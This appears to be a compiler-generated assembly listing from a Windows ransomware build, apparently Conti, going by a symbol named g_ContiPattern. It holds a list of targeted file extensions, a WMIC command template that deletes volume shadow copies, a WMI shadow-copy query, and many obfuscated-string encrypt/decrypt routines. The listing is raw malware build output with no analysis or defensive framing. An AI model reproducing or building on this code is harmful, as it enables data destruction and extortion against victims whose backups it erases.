CONST	SEGMENT
??_C@_19IBFKCKFB@?$AA?4?$AAo?$AAr?$AAa@ DB '.', 00H, 'o', 00H, 'r', 00H, 'a'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DONJPAOI@?$AA?4?$AAa?$AAr?$AAc@
CONST	SEGMENT
??_C@_19DONJPAOI@?$AA?4?$AAa?$AAr?$AAc@ DB '.', 00H, 'a', 00H, 'r', 00H, 'c'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19KJPKOJBP@?$AA?4?$AAa?$AAd?$AAp@
CONST	SEGMENT
??_C@_19KJPKOJBP@?$AA?4?$AAa?$AAd?$AAp@ DB '.', 00H, 'a', 00H, 'd', 00H, 'p'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19NMIIOBFM@?$AA?4?$AAa?$AAd?$AAf@
CONST	SEGMENT
??_C@_19NMIIOBFM@?$AA?4?$AAa?$AAd?$AAf@ DB '.', 00H, 'a', 00H, 'd', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19MODNEOLC@?$AA?4?$AAa?$AAd?$AAe@
CONST	SEGMENT
??_C@_19MODNEOLC@?$AA?4?$AAa?$AAd?$AAe@ DB '.', 00H, 'a', 00H, 'd', 00H, 'e'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19FDOKHGAL@?$AA?4?$AAa?$AAd?$AAb@
CONST	SEGMENT
??_C@_19FDOKHGAL@?$AA?4?$AAa?$AAd?$AAb@ DB '.', 00H, 'a', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@MFAIEIKA@?$AA?4?$AAa?$AAc?$AAc?$AAf?$AAt@
CONST	SEGMENT
??_C@_1O@MFAIEIKA@?$AA?4?$AAa?$AAc?$AAc?$AAf?$AAt@ DB '.', 00H, 'a', 00H, 'c'
	DB	00H, 'c', 00H, 'f', 00H, 't', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@IIMAOJKL@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAt@
CONST	SEGMENT
??_C@_1O@IIMAOJKL@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAt@ DB '.', 00H, 'a', 00H, 'c'
	DB	00H, 'c', 00H, 'd', 00H, 't', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@KNKLLGHH@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAr@
CONST	SEGMENT
??_C@_1O@KNKLLGHH@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAr@ DB '.', 00H, 'a', 00H, 'c'
	DB	00H, 'c', 00H, 'd', 00H, 'r', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@GAGFNJFB@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAe@
CONST	SEGMENT
??_C@_1O@GAGFNJFB@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAe@ DB '.', 00H, 'a', 00H, 'c'
	DB	00H, 'c', 00H, 'd', 00H, 'e', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@EFAOIGIN@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAc@
CONST	SEGMENT
??_C@_1O@EFAOIGIN@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAc@ DB '.', 00H, 'a', 00H, 'c'
	DB	00H, 'c', 00H, 'd', 00H, 'c', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@PNLCOBOI@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAb@
CONST	SEGMENT
??_C@_1O@PNLCOBOI@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAb@ DB '.', 00H, 'a', 00H, 'c'
	DB	00H, 'c', 00H, 'd', 00H, 'b', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_19KOPDPMJK@?$AA?4?$AA4?$AAd?$AAl@
CONST	SEGMENT
??_C@_19KOPDPMJK@?$AA?4?$AA4?$AAd?$AAl@ DB '.', 00H, '4', 00H, 'd', 00H, 'l'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19GLEHNEHF@?$AA?4?$AA4?$AAd?$AAd@
CONST	SEGMENT
??_C@_19GLEHNEHF@?$AA?4?$AA4?$AAd?$AAd@ DB '.', 00H, '4', 00H, 'd', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1JO@IHCPLJNE@?$AAc?$AAm?$AAd?$AA?4?$AAe?$AAx?$AAe?$AA?5?$AA?1?$AAc?$AA?5?$AAC?$AA?3?$AA?2?$AAW@
CONST	SEGMENT
??_C@_1JO@IHCPLJNE@?$AAc?$AAm?$AAd?$AA?4?$AAe?$AAx?$AAe?$AA?5?$AA?1?$AAc?$AA?5?$AAC?$AA?3?$AA?2?$AAW@ DB 'c'
	DB	00H, 'm', 00H, 'd', 00H, '.', 00H, 'e', 00H, 'x', 00H, 'e', 00H
	DB	' ', 00H, '/', 00H, 'c', 00H, ' ', 00H, 'C', 00H, ':', 00H, '\'
	DB	00H, 'W', 00H, 'i', 00H, 'n', 00H, 'd', 00H, 'o', 00H, 'w', 00H
	DB	's', 00H, '\', 00H, 'S', 00H, 'y', 00H, 's', 00H, 't', 00H, 'e'
	DB	00H, 'm', 00H, '3', 00H, '2', 00H, '\', 00H, 'w', 00H, 'b', 00H
	DB	'e', 00H, 'm', 00H, '\', 00H, 'W', 00H, 'M', 00H, 'I', 00H, 'C'
	DB	00H, '.', 00H, 'e', 00H, 'x', 00H, 'e', 00H, ' ', 00H, 's', 00H
	DB	'h', 00H, 'a', 00H, 'd', 00H, 'o', 00H, 'w', 00H, 'c', 00H, 'o'
	DB	00H, 'p', 00H, 'y', 00H, ' ', 00H, 'w', 00H, 'h', 00H, 'e', 00H
	DB	'r', 00H, 'e', 00H, ' ', 00H, '"', 00H, 'I', 00H, 'D', 00H, '='
	DB	00H, '''', 00H, '%', 00H, 's', 00H, '''', 00H, '"', 00H, ' ', 00H
	DB	'd', 00H, 'e', 00H, 'l', 00H, 'e', 00H, 't', 00H, 'e', 00H, 00H
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_15HCBMMKJC@?$AAI?$AAD@
CONST	SEGMENT
??_C@_15HCBMMKJC@?$AAI?$AAD@ DB 'I', 00H, 'D', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1DO@GDIJLNFO@?$AAS?$AAE?$AAL?$AAE?$AAC?$AAT?$AA?5?$AA?$CK?$AA?5?$AAF?$AAR?$AAO?$AAM?$AA?5?$AAW@
CONST	SEGMENT
??_C@_1DO@GDIJLNFO@?$AAS?$AAE?$AAL?$AAE?$AAC?$AAT?$AA?5?$AA?$CK?$AA?5?$AAF?$AAR?$AAO?$AAM?$AA?5?$AAW@ DB 'S'
	DB	00H, 'E', 00H, 'L', 00H, 'E', 00H, 'C', 00H, 'T', 00H, ' ', 00H
	DB	'*', 00H, ' ', 00H, 'F', 00H, 'R', 00H, 'O', 00H, 'M', 00H, ' '
	DB	00H, 'W', 00H, 'i', 00H, 'n', 00H, '3', 00H, '2', 00H, '_', 00H
	DB	'S', 00H, 'h', 00H, 'a', 00H, 'd', 00H, 'o', 00H, 'w', 00H, 'C'
	DB	00H, 'o', 00H, 'p', 00H, 'y', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_17NDCOOGJO@?$AAW?$AAQ?$AAL@
CONST	SEGMENT
??_C@_17NDCOOGJO@?$AAW?$AAQ?$AAL@ DB 'W', 00H, 'Q', 00H, 'L', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BG@BJADHBOD@?$AAR?$AAO?$AAO?$AAT?$AA?2?$AAC?$AAI?$AAM?$AAV?$AA2@
CONST	SEGMENT
??_C@_1BG@BJADHBOD@?$AAR?$AAO?$AAO?$AAT?$AA?2?$AAC?$AAI?$AAM?$AAV?$AA2@ DB 'R'
	DB	00H, 'O', 00H, 'O', 00H, 'T', 00H, '\', 00H, 'C', 00H, 'I', 00H
	DB	'M', 00H, 'V', 00H, '2', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1CO@KINCPPDA@?$AA_?$AA_?$AAP?$AAr?$AAo?$AAv?$AAi?$AAd?$AAe?$AAr?$AAA?$AAr?$AAc?$AAh?$AAi@
CONST	SEGMENT
??_C@_1CO@KINCPPDA@?$AA_?$AA_?$AAP?$AAr?$AAo?$AAv?$AAi?$AAd?$AAe?$AAr?$AAA?$AAr?$AAc?$AAh?$AAi@ DB '_'
	DB	00H, '_', 00H, 'P', 00H, 'r', 00H, 'o', 00H, 'v', 00H, 'i', 00H
	DB	'd', 00H, 'e', 00H, 'r', 00H, 'A', 00H, 'r', 00H, 'c', 00H, 'h'
	DB	00H, 'i', 00H, 't', 00H, 'e', 00H, 'c', 00H, 't', 00H, 'u', 00H
	DB	'r', 00H, 'e', 00H, 00H, 00H			; `string'
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
	ORG $+7
?g_ContiPattern@@3QBEB DB 0abH				; g_ContiPattern
	DB	0ffH
	DB	063H
	DB	0a1H
	DB	06fH
	DB	0a2H
	DB	06eH
	DB	06eH
	DB	0a3H
	DB	074H
	DB	069H
	DB	0bfH
	DB	04cH
	DB	0ddH
	DB	0ffH
	DB	0a1H
PUBLIC	?isDecrypted@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@QEBA_NXZ ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@AEBAEE@Z ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$01$0FF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@@std@@@@AEBAEE@Z ; MetaBuffer<2,85,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@QEBA_NXZ ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@AEBAEE@Z ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$02$0BC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@$0HC@$0HD@$0HE@$0HF@$0HG@$0HH@$0HI@$0HJ@$0HK@$0HL@$0HM@$0HN@$0HO@$0HP@$0IA@$0IB@$0IC@$0ID@$0IE@$0IF@$0IG@$0IH@$0II@$0IJ@$0IK@$0IL@$0IM@$0IN@$0IO@$0IP@$0JA@$0JB@$0JC@$0JD@$0JE@$0JF@$0JG@$0JH@$0JI@$0JJ@$0JK@$0JL@$0JM@$0JN@@std@@@@AEBAEE@Z ; MetaBuffer<3,18,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0ED@$0GB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<67,97,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<107,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0L@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<11,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$06$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<7,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$01$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<2,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0EH@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ; MetaBuffer<71,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
